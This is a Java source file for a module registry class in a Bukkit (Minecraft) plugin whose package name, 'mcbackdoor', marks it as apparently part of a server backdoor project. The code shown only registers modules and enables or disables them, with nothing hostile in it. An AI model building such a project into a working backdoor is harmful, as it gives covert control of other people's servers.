/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd;

import java.util.HashMap;
import java.util.Iterator;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

/**
 *
 * @author Kekec852
 */
public class ModuleProvider {

    private HashMap<String, Module> modules = new HashMap<String, Module>();
    private final JavaPlugin jp;

    public ModuleProvider(JavaPlugin jp) {
        this.jp = jp;
    }

    public void registerModule(Module module) {
        module.setPlugin(jp);
        modules.put(module.getCMD(), module);
    }

    public Module getModule(String cmd) {
        return modules.get(cmd);
    }

    public void enable() {
        Iterator<Module> i = modules.values().iterator();
        while (i.hasNext()) {
            i.next().enable();
        }
    }

    public void disable() {
        Iterator<Module> i = modules.values().iterator();
        while (i.hasNext()) {
            i.next().disable();
        }
    }
}
